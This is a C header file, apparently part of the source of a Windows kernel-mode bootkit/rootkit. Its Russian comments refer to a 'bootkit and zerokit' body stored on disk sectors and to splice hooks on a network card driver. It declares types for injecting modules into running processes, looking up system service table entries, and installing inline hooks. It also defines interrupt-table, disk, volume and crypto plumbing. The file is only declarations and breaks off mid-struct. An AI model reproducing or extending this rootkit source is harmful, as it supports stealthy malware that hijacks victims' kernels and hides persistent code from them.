#ifndef __MODSHARED_COMMONAPI_H_
#define __MODSHARED_COMMONAPI_H_

#include "../../mod_shared/overlord_ext.h"

typedef enum _KTHREAD_STATE
{
    Initialized,    
    Ready,     
    Running,     
    Standby,     
    Terminated,     
    Waiting,     
    Transition
} KTHREAD_STATE, *PKTHREAD_STATE;

#pragma pack(push, 1)

typedef struct _IDTR
{
    uint16_t limit;
    uint8_t* addr;
} IDTR, *PIDTR;

#ifdef _WIN64

typedef struct _IDT_ENTRY
{
    uint16_t offset00_15;
    uint16_t selector;
    uint8_t ist:3;        // Interrupt Stack Table
    uint8_t zeroes:5;
    uint8_t gateType:4;
    uint8_t zero:1;
    uint8_t dpl:2;
    uint8_t p:1;
    uint16_t offset16_31;
    uint32_t offset32_63;
    uint32_t unused;
} IDT_ENTRY, *PIDT_ENTRY;

#else

typedef struct _IDT_ENTRY
{
    uint16_t offset00_15;
    uint16_t selector;
    uint8_t unused:5;
    uint8_t zeroes:3;
    uint8_t gateType:5;
    uint8_t dpl:2;
    uint8_t p:1;
    uint16_t offset16_31;
} IDT_ENTRY, *PIDT_ENTRY;

#endif // __AMD64_

#pragma pack(pop)

typedef void (*Fnshutdown_routine)();

typedef bool_t (*Fncommon_save_file)(char* fileName, uint8_t* pData, ulong_t dataLen);

//typedef pvoid_t (*FnUtilsGetApiFuncVA)(PEPROCESS pep, uint32_t moduleHash, uint32_t apiHash, uint8_t** pModuleBase, bool_t findModule);
//typedef bool_t (*FnUtilsDisablePageNXBit)(pvoid_t ptr, uint32_t size);

//typedef VOID (*FnKdVersionBlockDpc)(__in struct _KDPC* Dpc, __in_opt pvoid_t DeferredContext, __in_opt pvoid_t SystemArgument1, __in_opt pvoid_t SystemArgument2);
//typedef void (*FnUtilsAllocateMemory)(pvoid_t* ppVA, size_t size, POOL_TYPE poolType);

typedef void (*FnTasksProcess)();

typedef uint32_t (*FnUtilsGetSystem)();

typedef pvoid_t (*FnUtilsFindServiceTableEntry)(PEPROCESS pep, uint32_t funcHash);

typedef void (*FnTasksProcess)();

//typedef bool_t (*FnInstallUserModeApc)(PETHREAD eThread, PEPROCESS eProcess, char* appPath);
typedef NTSTATUS (*FnInjectIntoExistingProcess)(PEPROCESS Process, uint8_t* pModule, ulong_t ModuleSize, bool_t nativeThread, pvoid_t InjectData, ulong_t InjectDataSize);

//typedef void (*Fnplug_holes)(struct mem *mem);

typedef void (*FnUtilsAtomicAdd16)(uint16_t* atomic, uint16_t value);
typedef uint16_t (*FnUtilsAtomicGet)(const uint16_t* atomic);
typedef void (*FnUtilsAtomicSub16)(uint32_t* atomic, uint16_t value);



typedef void (*Fncommon_change_byte_order)(PCHAR szString, uint16_t uscStrSize);

typedef VOID (*Fncommon_initialize_list_head)(PLIST_ENTRY pListHead);
typedef bool_t (*Fncommon_is_list_empty)(const PLIST_ENTRY pListHead);
typedef bool_t (*Fncommon_remove_entry_list)(PLIST_ENTRY pEntry);
typedef PLIST_ENTRY (*Fncommon_remove_head_list)(PLIST_ENTRY pListHead);
typedef PLIST_ENTRY (*Fncommon_remove_tail_list)(PLIST_ENTRY pListHead);
typedef VOID (*Fncommon_insert_tail_list)(PLIST_ENTRY pListHead, PLIST_ENTRY pEntry);
typedef VOID (*Fncommon_insert_head_list)(PLIST_ENTRY pListHead, PLIST_ENTRY pEntry);
typedef VOID (*Fncommon_append_tail_list)(PLIST_ENTRY pListHead, PLIST_ENTRY pListToAppend);

// The following structure is returned on an IOCTL_DISK_GET_PARTITION_INFO
// and an IOCTL_DISK_GET_DRIVE_LAYOUT request.  It is also used in a request
// to change the drive layout, IOCTL_DISK_SET_DRIVE_LAYOUT.
typedef struct _PARTITION_INFORMATION
{
    LARGE_INTEGER StartingOffset;
    LARGE_INTEGER PartitionLength;
    ulong_t HiddenSectors;
    ulong_t PartitionNumber;
    UCHAR PartitionType;
    bool_t BootIndicator;
    bool_t RecognizedPartition;
    bool_t RewritePartition;
} PARTITION_INFORMATION, *PPARTITION_INFORMATION;


// Define the media types supported by the driver.
typedef enum _MEDIA_TYPE {
    Unknown,                // Format is unknown
    F5_1Pt2_512,            // 5.25", 1.2MB,  512 bytes/sector
    F3_1Pt44_512,           // 3.5",  1.44MB, 512 bytes/sector
    F3_2Pt88_512,           // 3.5",  2.88MB, 512 bytes/sector
    F3_20Pt8_512,           // 3.5",  20.8MB, 512 bytes/sector
    F3_720_512,             // 3.5",  720KB,  512 bytes/sector
    F5_360_512,             // 5.25", 360KB,  512 bytes/sector
    F5_320_512,             // 5.25", 320KB,  512 bytes/sector
    F5_320_1024,            // 5.25", 320KB,  1024 bytes/sector
    F5_180_512,             // 5.25", 180KB,  512 bytes/sector
    F5_160_512,             // 5.25", 160KB,  512 bytes/sector
    RemovableMedia,         // Removable media other than floppy
    FixedMedia,             // Fixed hard disk media
    F3_120M_512,            // 3.5", 120M Floppy
    F3_640_512,             // 3.5" ,  640KB,  512 bytes/sector
    F5_640_512,             // 5.25",  640KB,  512 bytes/sector
    F5_720_512,             // 5.25",  720KB,  512 bytes/sector
    F3_1Pt2_512,            // 3.5" ,  1.2Mb,  512 bytes/sector
    F3_1Pt23_1024,          // 3.5" ,  1.23Mb, 1024 bytes/sector
    F5_1Pt23_1024,          // 5.25",  1.23MB, 1024 bytes/sector
    F3_128Mb_512,           // 3.5" MO 128Mb   512 bytes/sector
    F3_230Mb_512,           // 3.5" MO 230Mb   512 bytes/sector
    F8_256_128,             // 8",     256KB,  128 bytes/sector
    F3_200Mb_512,           // 3.5",   200M Floppy (HiFD)
    F3_240M_512,            // 3.5",   240Mb Floppy (HiFD)
    F3_32M_512              // 3.5",   32Mb Floppy
} MEDIA_TYPE, *PMEDIA_TYPE;

#define IOCTL_DISK_BASE                 FILE_DEVICE_DISK
#define IOCTL_DISK_GET_DRIVE_GEOMETRY   CTL_CODE(IOCTL_DISK_BASE, 0x0000, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DISK_GET_DRIVE_LAYOUT     CTL_CODE(IOCTL_DISK_BASE, 0x0003, METHOD_BUFFERED, FILE_READ_ACCESS)

// The following structure is returned on an IOCTL_DISK_GET_DRIVE_GEOMETRY
// request and an array of them is returned on an IOCTL_DISK_GET_MEDIA_TYPES
// request.
typedef struct _DISK_GEOMETRY
{
    LARGE_INTEGER Cylinders;
    MEDIA_TYPE MediaType;
    ulong_t TracksPerCylinder;
    ulong_t SectorsPerTrack;
    ulong_t BytesPerSector;
} DISK_GEOMETRY, *PDISK_GEOMETRY;

typedef struct _DISK_GEOMETRY_EX {
    DISK_GEOMETRY Geometry;                                 // Standard disk geometry: may be faked by driver.
    LARGE_INTEGER DiskSize;                                 // Must always be correct
    uint8_t  Data[1];                                                  // Partition, Detect info
} DISK_GEOMETRY_EX, *PDISK_GEOMETRY_EX;

typedef enum partition_fs {
    Par_Unknown,
    Par_FAT32,
    Par_NTFS,    
} partition_fs_e;

#define SECTOR_SIZE 512

#define DFLAG_SYSTEM_DISK     0x01
#define DFLAG_BOOTABLE_DISK   0x02

struct _disk_info;
struct _volume_info;

typedef struct _disk_list_entry
{
    LIST_ENTRY entry;
    struct _disk_info* pDiskInfo;
} disk_list_entry_t, *pdisk_list_entry_t;

typedef struct _volume_list_entry
{
    LIST_ENTRY entry;
    struct _volume_info* pVolumeInfo;
} volume_list_entry_t, *pvolume_list_entry_t;



typedef struct _disk_id_info
{
    uint16_t wGenConfig;                 // WORD 0
    uint16_t wNumCyls;                   // WORD 1
    uint16_t wReserved2;                 // WORD 2
    uint16_t wNumHeads;                  // WORD 3
    uint16_t wReserved4;                 // WORD 4
    uint16_t wReserved5;                 // WORD 5
    uint16_t wNumSectorsPerTrack;        // WORD 6
    uint16_t wVendorUnique[3];           // WORD 7-9
    char sSerialNumber[20];          // WORD 10-19
    uint16_t wBufferType;                // WORD 20
    uint16_t wBufferSize;                // WORD 21
    uint16_t wECCSize;                   // WORD 22:
    char sFirmwareRev[8];            // WORD 23-26
    char sModelNumber[40];           // WORD 27-46
    uint16_t wMoreVendorUnique;          // WORD 47
    uint16_t wReserved48;                // WORD 48
    struct
    {
        uint16_t reserved1:8;
        uint16_t DMA:1;                  //
        uint16_t LBA:1;                  //
        uint16_t DisIORDY:1;             //
        uint16_t IORDY:1;                //
        uint16_t SoftReset:1;            //
        uint16_t Overlap:1;              //
        uint16_t Queue:1;                //
        uint16_t InlDMA:1;               //
    } wCapabilities;                    // WORD 49
    uint16_t wReserved1;                 // WORD 50
    uint16_t wPIOTiming;                 // WORD 51
    uint16_t wDMATiming;                 // WORD 52
    struct
    {
        uint16_t CHSNumber:1;            // 1=WORD 54-58
        uint16_t CycleNumber:1;          // 1=WORD 64-70
        uint16_t UnltraDMA:1;            // 1=WORD 88
        uint16_t reserved:13;
    } wFieldValidity;                   // WORD 53
    uint16_t wNumCurCyls;                // WORD 54
    uint16_t wNumCurHeads;               // WORD 55
    uint16_t wNumCurSectorsPerTrack;     // WORD 56
    uint16_t wCurSectorsLow;             // WORD 57
    uint16_t wCurSectorsHigh;            // WORD 58
    struct
    {
        uint16_t CurNumber:8;            //
        uint16_t Multi:1;                //
        uint16_t reserved1:7;
    } wMultSectorStuff;                 // WORD 59
    uint32_t dwTotalSectors;              // WORD 60-61
    uint16_t wSingleWordDMA;             // WORD 62
    struct
    {
        uint16_t Mode0:1;                // 1 (4.17Mb/s)
        uint16_t Mode1:1;                // 1 (13.3Mb/s)
        uint16_t Mode2:1;                // 1 (16.7Mb/s)
        uint16_t Reserved1:5;
        uint16_t Mode0Sel:1;             //
        uint16_t Mode1Sel:1;             //
        uint16_t Mode2Sel:1;             //
        uint16_t Reserved2:5;
    } wMultiWordDMA;                    // WORD 63
    struct
    {
        uint16_t AdvPOIModes:8;          //
        uint16_t reserved:8;
    } wPIOCapacity;                     // WORD 64
    uint16_t wMinMultiWordDMACycle;      // WORD 65
    uint16_t wRecMultiWordDMACycle;      // WORD 66
    uint16_t wMinPIONoFlowCycle;         // WORD 67
    uint16_t wMinPOIFlowCycle;           // WORD 68
    uint16_t wReserved69[11];            // WORD 69-79
    struct
    {
        uint16_t Reserved1:1;
        uint16_t ATA1:1;                 // 1=ATA-1
        uint16_t ATA2:1;                 // 1=ATA-2
        uint16_t ATA3:1;                 // 1=ATA-3
        uint16_t ATA4:1;                 // 1=ATA/ATAPI-4
        uint16_t ATA5:1;                 // 1=ATA/ATAPI-5
        uint16_t ATA6:1;                 // 1=ATA/ATAPI-6
        uint16_t ATA7:1;                 // 1=ATA/ATAPI-7
        uint16_t ATA8:1;                 // 1=ATA/ATAPI-8
        uint16_t ATA9:1;                 // 1=ATA/ATAPI-9
        uint16_t ATA10:1;                // 1=ATA/ATAPI-10
        uint16_t ATA11:1;                // 1=ATA/ATAPI-11
        uint16_t ATA12:1;                // 1=ATA/ATAPI-12
        uint16_t ATA13:1;                // 1=ATA/ATAPI-13
        uint16_t ATA14:1;                // 1=ATA/ATAPI-14
        uint16_t Reserved2:1;
    } wMajorVersion;                    // WORD 80
    uint16_t wMinorVersion;              // WORD 81
    uint16_t wReserved82[6];             // WORD 82-87
    struct
    {
        uint16_t Mode0:1;                // 1 (16.7Mb/s)
        uint16_t Mode1:1;                // 1 (25Mb/s)
        uint16_t Mode2:1;                // 1 (33Mb/s)
        uint16_t Mode3:1;                // 1 (44Mb/s)
        uint16_t Mode4:1;                // 1 (66Mb/s)
        uint16_t Mode5:1;                // 1 (100Mb/s)
        uint16_t Mode6:1;                // 1 (133Mb/s)
        uint16_t Mode7:1;                // 1 (166Mb/s) ???
        uint16_t Mode0Sel:1;             //
        uint16_t Mode1Sel:1;             //
        uint16_t Mode2Sel:1;             //
        uint16_t Mode3Sel:1;             //
        uint16_t Mode4Sel:1;             //
        uint16_t Mode5Sel:1;             //
        uint16_t Mode6Sel:1;             //
        uint16_t Mode7Sel:1;             //
    } wUltraDMA;                        // WORD 88
    uint16_t wReserved89[167];         // WORD 89-255
} disk_id_info_t, *pdisk_id_info_t;

typedef struct _scsi_address {
    ulong_t Length;
    UCHAR PortNumber;
    UCHAR PathId;
    UCHAR TargetId;
    UCHAR Lun;
} scsi_address_t, *pscsi_address_t;

typedef struct _disk_info
{
    PDEVICE_OBJECT pDeviceObject;
    PDEVICE_OBJECT pLowerDevice;
    wchar_t devName[24];
    scsi_address_t scsiAddress;
    uint32_t bytesPerSector;
    uint32_t sectorsPerCyl;
    uint64_t totalSectors;      // Общее количество секторов на жёстком диске (включая невидимые секторы).
    uint64_t sizeInSectors;     // Актуальный размер диска в секторах.
    pvolume_list_entry_t pVolumeListHead;
    disk_id_info_t idInfo;
    char modelNumber[64];
    char firmwareRev[16];
    char serialNumber[32];
} disk_info_t, *pdisk_info_t;

typedef struct _volume_info
{
    PDEVICE_OBJECT pDeviceObject;   // Указатель на объект устройства.
    wchar_t devName[24];            // Имя устройства описывающего том диска.
    wchar_t driveLetter;            // Символ ассоциированный с диском.
//    uint32_t flags;
    PARTITION_INFORMATION parInfo;
    DISK_GEOMETRY geometry;
    pdisk_info_t pDiskInfo;         // Указатель на структуру, которая описывает физический диск.
//     partition_fs_e parFS;   // Файловая система.
//     uint32_t bytesPerSec;   // Количество байт в одном секторе.
//     uint32_t secsPerCyl;    // Количество секторов в цилиндре.
//     uint64_t totalSecs;     // Общее количество секторов.
} volume_info_t, *pvolume_info_t;



// CRYPTO
#define MPI_INIT pGlobalBlock->pCommonBlock->fnmpi_init
#define MPI_FREE pGlobalBlock->pCommonBlock->fnmpi_free
#define MPI_GROW pGlobalBlock->pCommonBlock->fnmpi_grow
#define MPI_COPY pGlobalBlock->pCommonBlock->fnmpi_copy
#define MPI_SWAP pGlobalBlock->pCommonBlock->fnmpi_swap
#define MPI_LSET pGlobalBlock->pCommonBlock->fnmpi_lset
#define MPI_LSB pGlobalBlock->pCommonBlock->fnmpi_lsb
#define MPI_MSB pGlobalBlock->pCommonBlock->fnmpi_msb
#define MPI_SIZE pGlobalBlock->pCommonBlock->fnmpi_size
#define MPI_GET_DIGIT pGlobalBlock->pCommonBlock->fnmpi_get_digit
#define MPI_MUL_HLP pGlobalBlock->pCommonBlock->fnmpi_mul_hlp
#define MPI_MUL_MPI pGlobalBlock->pCommonBlock->fnmpi_mul_mpi
#define MPI_MUL_INT pGlobalBlock->pCommonBlock->fnmpi_mul_int
#define MPI_CMP_ABS pGlobalBlock->pCommonBlock->fnmpi_cmp_abs
#define MPI_SUB_HLP pGlobalBlock->pCommonBlock->fnmpi_sub_hlp
#define MPI_SUB_ABS pGlobalBlock->pCommonBlock->fnmpi_sub_abs
#define MPI_ADD_ABS pGlobalBlock->pCommonBlock->fnmpi_add_abs
#define MPI_ADD_MPI pGlobalBlock->pCommonBlock->fnmpi_add_mpi
#define MPI_ADD_INT pGlobalBlock->pCommonBlock->fnmpi_add_int
#define MPI_SUB_MPI pGlobalBlock->pCommonBlock->fnmpi_sub_mpi
#define MPI_SUB_INT pGlobalBlock->pCommonBlock->fnmpi_sub_int
#define MPI_MOD_INT pGlobalBlock->pCommonBlock->fnmpi_mod_int
#define MPI_CMP_MPI pGlobalBlock->pCommonBlock->fnmpi_cmp_mpi
#define MPI_CMP_INT pGlobalBlock->pCommonBlock->fnmpi_cmp_int
#define MPI_SHIFT_L pGlobalBlock->pCommonBlock->fnmpi_shift_l
#define MPI_SHIFT_R pGlobalBlock->pCommonBlock->fnmpi_shift_r
#define MPI_DIV_MPI pGlobalBlock->pCommonBlock->fnmpi_div_mpi
#define MPI_DIV_INT pGlobalBlock->pCommonBlock->fnmpi_div_int
#define MPI_MOD_MPI pGlobalBlock->pCommonBlock->fnmpi_mod_mpi
#define MPI_MONTG_INIT pGlobalBlock->pCommonBlock->fnmpi_montg_init
#define MPI_MONTMUL pGlobalBlock->pCommonBlock->fnmpi_montmul
#define MPI_MONTRED pGlobalBlock->pCommonBlock->fnmpi_montred
#define MPI_EXP_MOD pGlobalBlock->pCommonBlock->fnmpi_exp_mod
#define MPI_GCD pGlobalBlock->pCommonBlock->fnmpi_gcd
#define MPI_READ_BINARY pGlobalBlock->pCommonBlock->fnmpi_read_binary
#define MPI_WRITE_BINARY pGlobalBlock->pCommonBlock->fnmpi_write_binary

#define RSA_INIT pGlobalBlock->pCommonBlock->fnrsa_init
#define RSA_FREE pGlobalBlock->pCommonBlock->fnrsa_free
#define RSA_PUBLIC pGlobalBlock->pCommonBlock->fnrsa_public
#define RSA_PRIVATE pGlobalBlock->pCommonBlock->fnrsa_private
#define RSA_PUBLIC_DECRYPT_HASH pGlobalBlock->pCommonBlock->fnrsa_public_decrypt_hash


#define SHA1_START pGlobalBlock->pCommonBlock->fnsha1_start
#define SHA1_PROCESS pGlobalBlock->pCommonBlock->fnsha1_process
#define SHA1_UPDATE pGlobalBlock->pCommonBlock->fnsha1_update
#define SHA1_FINISH pGlobalBlock->pCommonBlock->fnsha1_finish
#define SHA1_SHA1 pGlobalBlock->pCommonBlock->fnsha1

#define MD5_PROCESS pGlobalBlock->pCommonBlock->fnmd5_process
#define MD5_START pGlobalBlock->pCommonBlock->fnmd5_start
#define MD5_UPDATE pGlobalBlock->pCommonBlock->fnmd5_update
#define MD5_FINISH pGlobalBlock->pCommonBlock->fnmd5_finish
#define MD5_MD5 pGlobalBlock->pCommonBlock->fnmd5

#define ARC4_SETUP pGlobalBlock->pCommonBlock->fnarc4_setup
#define ARC4_CRYPT pGlobalBlock->pCommonBlock->fnarc4_crypt

#define AES_GEN_TABLES pGlobalBlock->pCommonBlock->fnaes_gen_tables
#define AES_SETKEY_ENC pGlobalBlock->pCommonBlock->fnaes_setkey_enc
#define AES_SETKEY_DEC pGlobalBlock->pCommonBlock->fnaes_setkey_dec
#define AES_CRYPT_ECB pGlobalBlock->pCommonBlock->fnaes_crypt_ecb
#define AES_CRYPT_CBC pGlobalBlock->pCommonBlock->fnaes_crypt_cbc
#define AES_VAR_FSb pGlobalBlock->pCommonBlock->FSb
#define AES_VAR_FT0 pGlobalBlock->pCommonBlock->FT0
#define AES_VAR_FT1 pGlobalBlock->pCommonBlock->FT1
#define AES_VAR_FT2 pGlobalBlock->pCommonBlock->FT2
#define AES_VAR_FT3 pGlobalBlock->pCommonBlock->FT3
#define AES_VAR_RSb pGlobalBlock->pCommonBlock->RSb
#define AES_VAR_RT0 pGlobalBlock->pCommonBlock->RT0
#define AES_VAR_RT1 pGlobalBlock->pCommonBlock->RT1
#define AES_VAR_RT2 pGlobalBlock->pCommonBlock->RT2
#define AES_VAR_RT3 pGlobalBlock->pCommonBlock->RT3
#define AES_VAR_RCON pGlobalBlock->pCommonBlock->RCON
#define AES_VAR_RCON pGlobalBlock->pCommonBlock->RCON
#define AES_VAR_POW pGlobalBlock->pCommonBlock->pow
#define AES_VAR_LOG pGlobalBlock->pCommonBlock->log
#define AES_VAR_INIT_DONE pGlobalBlock->pCommonBlock->aes_init_done

#define RSA_ANS1_HASH_SHA1 pGlobalBlock->pCommonBlock->asn1_hash_sha1
#include "../../shared/bn_mul.h"
#include "../../shared/bignum.h"
#include "../../shared/rsa.h"
#include "../../shared/md5.h"
#include "../../shared/arc4.h"
#include "../../shared/sha1.h"
#include "../../shared/aes.h"
#include "../../shared/lzma.h"

// Определяем заранее, чтобы не использовался стандартный вариант.
#define FN_HAVEGE_FILL pGlobalBlock->pCommonBlock->fnhavege_fill

#include "../../shared/havege.h"

// base64
typedef UINT8* (*Fnbase64_encode)(UINT8* outData, const UINT8* inData, uint32_t inSize);
typedef int (*Fnbase64_decode)(UINT8* inData, uint32_t inSize, UINT8* outData);

typedef void (*Fnmd5_start)(md5_context_t* ctx);
typedef void (*Fnmd5_process)(md5_context_t *ctx, const uint8_t data[64]);
typedef void (*Fnmd5_update)(md5_context_t* ctx, const uint8_t* data, size_t size);
typedef void (*Fnmd5_finish)(md5_context_t* ctx, uint8_t output[16]);
typedef void (*Fnmd5)(const uint8_t *input, size_t ilen, uint8_t output[16]);
// typedef void (*Fnmd5_hmac_start)(md5_context_t* ctx, const uint8_t* key, size_t keySize);
// typedef void (*Fnmd5_hmac_update)(md5_context_t* ctx, const uint8_t* data, size_t size);
// typedef void (*Fnmd5_hmac_finish)(md5_context_t* ctx, uint8_t output[16]);
// typedef void (*Fnmd5_hmac_reset)(md5_context_t* ctx);
// typedef void (*Fnmd5_hmac)(const uint8_t* key, size_t keySize, const uint8_t* data, size_t size, uint8_t output[16]);


typedef void (*Fnsha1_start)(sha1_context_t* ctx);
typedef void (*Fnsha1_process)(sha1_context_t* ctx, const uint8_t data[64]);
typedef void (*Fnsha1_update)(sha1_context_t* ctx, const uint8_t* data, size_t size);
typedef void (*Fnsha1_finish)(sha1_context_t* ctx, uint8_t output[20]);
typedef void (*Fnsha1)(const uint8_t* data, size_t size, uint8_t output[20]);
// typedef void (*Fnsha1_hmac_start)(sha1_context_t* ctx, const uint8_t* key, size_t keySize);
// typedef void (*Fnsha1_hmac_update)(sha1_context_t* ctx, const uint8_t* data, size_t size);
// typedef void (*Fnsha1_hmac_finish)(sha1_context_t* ctx, uint8_t output[20]);
// typedef void (*Fnsha1_hmac_reset)(sha1_context_t* ctx);
// typedef void (*Fnsha1_hmac)(const uint8_t* key, size_t keySize, const uint8_t* data, size_t size, uint8_t output[20]);

typedef void (*Fnarc4_crypt_self)(uint8_t* buffer, uint32_t length, const uint8_t* key, uint32_t keylen);
// 
// // LZO
// /* Error codes for the compression/decompression functions. Negative
//  * values are errors, positive values will be used for special but
//  * normal events.
//  */
// #define LZO_E_OK                    0
// #define LZO_E_ERROR                 (-1)
// #define LZO_E_OUT_OF_MEMORY         (-2)    /* [not used right now] */
// #define LZO_E_NOT_COMPRESSIBLE      (-3)    /* [not used right now] */
// #define LZO_E_INPUT_OVERRUN         (-4)
// #define LZO_E_OUTPUT_OVERRUN        (-5)
// #define LZO_E_LOOKBEHIND_OVERRUN    (-6)
// #define LZO_E_EOF_NOT_FOUND         (-7)
// #define LZO_E_INPUT_NOT_CONSUMED    (-8)
// #define LZO_E_NOT_YET_IMPLEMENTED   (-9)    /* [not used right now] */
// 
// typedef int (*Fnlzo_decompress)(const uint8_t* in, uint32_t in_len, uint8_t* out, PUINT out_len);

typedef uint32_t (*Fnhardclock)();
typedef void (*Fnhavege_fill)(phavege_state_t pHS);
typedef void (*Fnhavege_init)(phavege_state_t pHS);
typedef void (*Fnhavege_rand)(phavege_state_t pHS, uint8_t* buf, size_t len);

typedef int (*Fnlzma_decode)(uint8_t* outBuffer, uint32_t* pOutSize, const uint8_t* inBuffer, uint32_t inSize, ELzmaStatus* status);

typedef void (*Fnaes_gen_tables)();
typedef int (*Fnaes_setkey_enc)(paes_context_t ctx, const uint8_t* key, unsigned int keySize);
typedef int (*Fnaes_setkey_dec)(paes_context_t ctx, const uint8_t* key, unsigned int keySize);
typedef int (*Fnaes_crypt_ecb)(paes_context_t ctx, int mode, const uint8_t input[16], uint8_t output[16]);
typedef int (*Fnaes_crypt_cbc)(paes_context_t ctx, int mode, size_t length, uint8_t iv[16], const uint8_t* input, uint8_t* output);

typedef void (*Fnmpi_init)(mpi_t* X);
typedef void (*Fnmpi_free)(mpi_t* X);
typedef int (*Fnmpi_grow)(mpi_t* X, size_t nblimbs);
typedef int (*Fnmpi_copy)(mpi_t* X, const mpi_t* Y);
typedef int (*Fnmpi_lset)(mpi_t* X, long z);
typedef size_t (*Fnmpi_lsb)(const mpi_t* X);
typedef size_t (*Fnmpi_msb)(const mpi_t* X);
typedef size_t (*Fnmpi_size)(const mpi_t* X);
typedef int (*Fnmpi_read_binary)(mpi_t* X, const unsigned char* buf, size_t buflen);
typedef int (*Fnmpi_write_binary)(const mpi_t* X, unsigned char* buf, size_t buflen);
typedef int (*Fnmpi_shift_l)(mpi_t* X, size_t count);
typedef int (*Fnmpi_shift_r)(mpi_t* X, size_t count);
typedef int (*Fnmpi_cmp_abs)(const mpi_t* X, const mpi_t* Y);
typedef int (*Fnmpi_cmp_mpi)(const mpi_t* X, const mpi_t* Y);
typedef int (*Fnmpi_cmp_int)(const mpi_t* X, long z);
typedef int (*Fnmpi_add_abs)(mpi_t* X, const mpi_t* A, const mpi_t* B);
typedef void (*Fnmpi_sub_hlp)(size_t n, ulong_t* s, ulong_t* d);
typedef int (*Fnmpi_sub_abs)(mpi_t* X, const mpi_t* A, const mpi_t* B);
typedef int (*Fnmpi_add_mpi)(mpi_t* X, const mpi_t* A, const mpi_t* B);
typedef int (*Fnmpi_sub_mpi)(mpi_t* X, const mpi_t* A, const mpi_t* B);
typedef int (*Fnmpi_sub_int)(mpi_t* X, const mpi_t* A, long b);
typedef void (*Fnmpi_mul_hlp)(size_t i, ulong_t* s, ulong_t* d, ulong_t b);
typedef int (*Fnmpi_mul_mpi)(mpi_t* X, const mpi_t* A, const mpi_t* B);
typedef int (*Fnmpi_mul_int)(mpi_t* X, const mpi_t* A, long b);
typedef int (*Fnmpi_div_mpi)(mpi_t* Q, mpi_t* R, const mpi_t* A, const mpi_t* B);
typedef int (*Fnmpi_mod_mpi)(mpi_t* R, const mpi_t* A, const mpi_t* B);
typedef void (*Fnmpi_montg_init)(ulong_t* mm, const mpi_t* N);
typedef void (*Fnmpi_montmul)(mpi_t* A, const mpi_t* B, const mpi_t* N, ulong_t mm, const mpi_t* T);
typedef void (*Fnmpi_montred)(mpi_t* A, const mpi_t* N, ulong_t mm, const mpi_t* T);
typedef int (*Fnmpi_exp_mod)(mpi_t* X, const mpi_t* A, const mpi_t* E, const mpi_t* N, mpi_t* _RR);
typedef int (*Fnmpi_gcd)(mpi_t* G, const mpi_t* A, const mpi_t* B);

// 
typedef void (*Fnrsa_init)(rsa_context_t* ctx, int padding, int hash_id);
typedef void (*Fnrsa_free)(rsa_context_t* ctx);
typedef int (*Fnrsa_check_pubkey)(const rsa_context_t* ctx);
typedef int (*Fnrsa_check_privkey)(const rsa_context_t* ctx);
typedef int (*Fnrsa_public)(rsa_context_t* ctx, const uint8_t* input, uint8_t* output);
typedef int (*Fnrsa_private)(rsa_context_t* ctx, const uint8_t* input, uint8_t* output);
typedef int (*Fnrsa_pkcs1_encrypt)(rsa_context_t *ctx, int mode, size_t ilen, const uint8_t* input, uint8_t* output);
typedef int (*Fnrsa_public_decrypt_hash)(rsa_context_t* ctx, uint8_t* sig, uint8_t* hash, int* pHashSize);
// typedef int (*Fnrsa_pkcs1_sign)(rsa_context_t* ctx, int (*f_rng)(void*), void* p_rng, int mode, int hash_id, unsigned int hashlen, const uint8_t* hash, uint8_t* sig);
// typedef int (*Fnrsa_pkcs1_verify)(rsa_context_t* ctx, int mode, int hash_id, unsigned int hashlen, const uint8_t* hash, uint8_t* sig);

typedef void (*Fncrypto_random_init)(rsa_context_t* pRsa);
typedef uint32_t (*Fncrypto_random)(uint32_t* seed);


// DISASSM
#define CUSTOM_TABLE 1
#include "../../shared/ring0/hde.h"

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// Структуры и определения для слайс-хуков драйвера сетевой карты
#define LOCAL_HOOK_SIGNATURE ((ulong_t)0x6A910BE2)

#pragma pack(push, 1)

typedef struct _splice_hooker_data
{
    uint8_t* fnOrig; // Указатель на трамплин к реальной функции.
    uint8_t* pTrampoline;          // Указатель на трамплин.
    pvoid_t pHookContext;
    uint8_t* pOrigFunc;
    uint8_t* pRealHookPtr;
    uint64_t pPrefixBackup;
    uint64_t pPrefixBackup_x64;
    uint64_t pHookCopy;
    uint32_t entrySize;         // Размер точки входа в оригинальной функции.    

    pvoid_t origRetAddr;        // Временное место для хранения оригинального адреса возврата.
    pvoid_t edxVal;             // Временное место для хранения регистра edx (rdx для x64).
    pvoid_t ecxVal;             // Временное место для хранения регистра ecx (rcx для x64).

    uint8_t* pHookFunc;
    pvoid_t pThis;
} splice_hooker_data_t, *psplice_hooker_data_t;

#pragma pack(pop)

#define THROW(code)	{ ntStatus = (code); goto THROW_OUTRO; }
#define RETURN		{ ntStatus = STATUS_SUCCESS; goto FINALLY_OUTRO; }
#define FORCE(expr)	{ if (!NT_SUCCESS(ntStatus = (expr))) goto THROW_OUTRO; }

typedef void (*FnCriticalCallback)(psplice_hooker_data_t pHookerData);

typedef void (*Fndissasm_lock_routine)(PKDPC pDpc, pvoid_t context, pvoid_t arg1, pvoid_t arg2);
typedef pvoid_t (*Fndissasm_install_hook)(pvoid_t pContext, pvoid_t origProc, pvoid_t hookProc, bool_t triggered, uint8_t* memHookData, uint32_t* allocatedSize, FnCriticalCallback fnCriticalCallback);
typedef void (*Fndissasm_uninstall_hook)(psplice_hooker_data_t pHookerData);


typedef struct _mod_common_private
{
    Fncommon_change_byte_order fncommon_change_byte_order;

    wchar_t driverWord[8]; // "\Driver"

    PUNICODE_STRING deviceStr;

    // Native data
    uint8_t* ntkernelBase;
    size_t ntkernelSize;
    uint8_t* halBase;
    uint32_t halSize;

    POBJECT_TYPE* pPsProcessType;
    POBJECT_TYPE* pPsThreadType;
    POBJECT_TYPE* pIoDeviceObjectType;
    POBJECT_TYPE* pIoDriverObjectType;
    POBJECT_TYPE* pIoFileObjectType;

    PSDE pKeServiceDescriptorTable;
    uint8_t* pKiServiceTable;

    ulong_t timeIncrement; // Возвращаемое значение функции KeQueryTimeIncrement.

    uint8_t* pModBase;

    PUNICODE_STRING ntCurrVerKey;
    PUNICODE_STRING sysRootWord;

    wchar_t driversPath[32];
    wchar_t mountMgrDevName[28];
    wchar_t bootDevLink[48];
    wchar_t partPrefix[24];
    wchar_t partPostfix[12];

    uint64_t bodySecOffset;         // Смещение сектора до места, где хранится тело буткита и зерокита.
    zerokit_header_t zerokitHeader; // Заголовок, который считан с диска при запуске зерокита.
    pvolume_list_entry_t pVolumesListHead;
    pdisk_list_entry_t pDisksListHead;
